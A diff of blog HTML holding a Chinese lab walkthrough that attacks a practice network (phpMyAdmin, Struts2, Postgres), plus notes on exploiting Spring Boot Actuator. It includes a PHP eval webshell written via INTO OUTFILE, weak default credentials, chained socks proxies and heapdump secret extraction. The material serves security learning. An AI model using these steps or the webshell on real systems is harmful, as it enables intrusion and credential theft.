 </span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">proxies</span>.<span style="color:#a6e22e">plugin</span>]
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">type</span> = <span style="color:#e6db74">&#34;socks5&#34;</span>
 </span></span></code></pre></div><p>配完之后
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_11.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_11.png" alt="" /></figure>
+
+
+
 配置一下proxychains
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_12.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_12.png" alt="" /></figure>
+
+
+</p>
 <h2 id="redis">redis</h2>
 <p>使用proxychains来实现使用代理</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4  nmap -sT -Pn 10.85.101.2 -p6379 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*redis*&#34;</span>
@@ -1677,34 +2322,94 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 <p>回到phpmyadmin
 弱口令进入后台</p>
 <pre tabindex="0"><code>localhost:root:root
-</code></pre><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_13.png" alt=""  /></p>
+</code></pre><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_13.png" alt="" /></figure>
+
+
+</p>
 <p>但是我进不去&hellip;.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_14.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_14.png" alt="" /></figure>
+
+
+
 重试了几遍,进去了</p>
 <p>拿到flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_15.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_15.png" alt="" /></figure>
+
+
+</p>
 <h3 id="into-outfile写入webshell">into-outfile写入webshell</h3>
 <p>尝试利用,这里去找了一下文章,<a href="https://www.zsblog.org/390.html" target="_blank" rel="noopener nofollow noreferrer" >PHPMyadmin-Mysql的Getshell姿势汇总 – 张三blog</a>
 先看看有没有权限写入文件,这里设置为空,没有限制
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_16.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_16.png" alt="" /></figure>
+
+
+
 这俩没啥用,直接猜是/var/www/html试试
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_17.png" alt=""  /> <img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_18.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_17.png" alt="" /></figure>
+
+
+ 
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_18.png" alt="" /></figure>
+
+
+
 写入webshell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_19.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_19.png" alt="" /></figure>
+
+
+
 获取一个webshell
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_20.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_20.png" alt="" /></figure>
+
+
+</p>
 <p>这个机器好像不出网&hellip;.尝试了几种payload,都拿不到shell,也不同wget访问我的攻击机.</p>
 <h3 id="蚁剑">蚁剑</h3>
 <p>网上搜了一下,看到有不出网环境下使用蚁剑的例子.</p>
 <p>用蚁剑看看
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_21.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_21.png" alt="" /></figure>
+
+
+
 拿到这个flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_22.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_22.png" alt="" /></figure>
+
+
+
 使用蚁剑的终端,来尝试反弹shell,但是还是不行,这好像是个不出网的环境&hellip;
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_23.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_23.png" alt="" /></figure>
+
+
+
 不过蚁剑带的文件上传功能能用
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_24.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_24.png" alt="" /></figure>
+
+
+</p>
 <h3 id="内网扫描-2">内网扫描</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>root:/tmp<span style="color:#f92672">)</span> $ ip a
 </span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
@@ -1720,7 +2425,12 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>    inet 172.56.102.4/24 brd 172.56.102.255 scope global eth1
 </span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
 </span></span></code></pre></div><p>执行fscan之后,没有回显,但是有输出文件
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_25.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_25.png" alt="" /></figure>
+
+
+
 跟之前一样,多了一个172.56.102.1,这到底是啥???🤔,大概率就是我运行docker的parrot机器了</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.1:22 open
 </span></span><span style="display:flex;"><span>172.56.102.4:80 open
@@ -1745,7 +2455,12 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>172.56.102.3   Postgres
 </span></span><span style="display:flex;"><span>172.56.102.2   struts2
 </span></span></code></pre></div><p>这里直接拿巨魔的拓扑图
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_26.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_26.png" alt="" /></figure>
+
+
+
 我现在需要再配置一个socks代理,服务器放在thinkphp机器上,客户端放在phpmyadmin机器上</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">phpmyadmin</span>.<span style="color:#a6e22e">toml</span>
 </span></span><span style="display:flex;"><span>
@@ -1758,7 +2473,12 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">remotePort</span> = <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">proxies</span>.<span style="color:#a6e22e">plugin</span>]
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">type</span> = <span style="color:#e6db74">&#34;socks5&#34;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_27.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_27.png" alt="" /></figure>
+
+
+
 然后在proxychains里面配置两个代理</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socks5 192.168.122.102 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>socks5 10.85.101.4 <span style="color:#ae81ff">9998</span>
@@ -1780,16 +2500,41 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.89 seconds
 </span></span></code></pre></div><p>代理成功了,接下来需要在Windows上面也使用多重代理,这时候要上proxifier了.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_28.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_28.png" alt="" /></figure>
+
+
+
 配置完之后,成功访问Struts服务器.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_29.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_29.png" alt="" /></figure>
+
+
+</p>
 <h2 id="struts">Struts</h2>
 <p>漏洞存在
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_30.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_30.png" alt="" /></figure>
+
+
+
 执行命令
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_31.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_31.png" alt="" /></figure>
+
+
+
 获取flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_32.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_32.png" alt="" /></figure>
+
+
+</p>
 <h2 id="postgres">Postgres</h2>
 <p>之前fscan扫出来的弱口令
 <code>[+] Postgres:172.56.102.3:5432:postgres password</code></p>
@@ -1946,19 +2691,44 @@ POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh �
 <h2 id="漏洞检测">漏洞检测</h2>
 <h3 id="检测清单">检测清单</h3>
 <p><a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/LandGrey/SpringBootVulExploit</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_1.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_2.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_1.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_2.png" alt="" /></figure>
+
+
+</p>
 <h3 id="黑盒发现">黑盒发现</h3>
 <p>人工识别，BP插件</p>
 <p>人工识别
 1、网站图片文件是一个绿色的树叶。2、特有的报错信息。3、Whitelabel Error Page关键字
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_3.png" alt="|750"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_3.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
 <p>BP插件
 <a href="https://github.com/API-Security/APIKit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/API-Security/APIKit</a>
 打开BurpSuite页面,点击Extender然后选择Extensions,添加APIKit.jar
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_4.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_4.png" alt="" /></figure>
+
+
+
 安装好插件后啥都不用管，让数据包经过BP即可触发插件被动扫描
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_5.png" alt="|800"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_5.png" alt="|800" /><figcaption>|800</figcaption></figure>
+
+
+</p>
 <h3 id="白盒发现">白盒发现</h3>
 <p>pom.xml,引用库</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
@@ -1966,60 +2736,205 @@ POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh �
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>spring-boot-starter-actuator<span style="color:#f92672">&lt;/artifactId&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
 </span></span></code></pre></div><p>配置文件Actuator设置全部暴露<code>management.endpoints.web.exposure.include=*</code>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_6.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_7.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_6.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_7.png" alt="" /></figure>
+
+
+</p>
 <h2 id="信息泄露利用">信息泄露利用</h2>
 <h3 id="内部路由泄露">内部路由泄露</h3>
 <p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_8.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_9.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_8.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_9.png" alt="" /></figure>
+
+
+</p>
 <h3 id="heapdump敏感信息查询">heapdump敏感信息查询</h3>
 <p>配置密码，AK/SK等</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_10.png" alt="|800"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_10.png" alt="|800" /><figcaption>|800</figcaption></figure>
+
+
+</p>
 <p>下载下来
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_11.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_11.png" alt="" /></figure>
+
+
+
 然后使用JDumpSPider工具来获取数据
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_12.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_12.png" alt="" /></figure>
+
+
+</p>
 <p>![](<a href="https://img.l1uyun.one/Pasted" target="_blank" rel="noopener nofollow noreferrer" >https://img.l1uyun.one/Pasted</a> image 20240806101506.png)</p>
 <p>这里还有另外一款工具,支持关键词搜索
 <a href="https://github.com/wyzxxz/heapdump_tool" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/wyzxxz/heapdump_tool</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_14.png" alt="|750"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_15.png" alt="|850"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_16.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_14.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_15.png" alt="|850" /><figcaption>|850</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_16.png" alt="" /></figure>
+
+
+</p>
 <h2 id="漏洞利用">漏洞利用</h2>
 <h3 id="框架漏洞">框架漏洞</h3>
 <p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_17.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_18.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_19.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_17.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_18.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_19.png" alt="" /></figure>
+
+
+</p>
 <h3 id="利用类漏洞来进行rce攻击">利用类漏洞来进行RCE攻击</h3>
 <p>服务器上执行JNDIExploit工具(可以本地、也可以远程VPS上运行)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_20.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_21.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_22.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_23.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_20.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_21.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_22.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_23.png" alt="" /></figure>
+
+
+</p>
 <h1 id="cms源码审计">CMS源码审计</h1>
 <h2 id="安装源码">安装源码</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_24.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_25.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_26.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_27.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_28.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_29.png" alt=""  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_24.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_25.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_26.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_27.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_28.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_29.png" alt="" /></figure>
+
+
+
 起始就是把actuator的接口做了可视化
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_30.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_30.png" alt="" /></figure>
+
+
+</p>
 <h2 id="源码审计">源码审计</h2>
 <p>从pom.xml看有没有调用Actuator库
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_31.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_31.png" alt="" /></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>配置文件中Actuator设置是否为*(全部暴露)
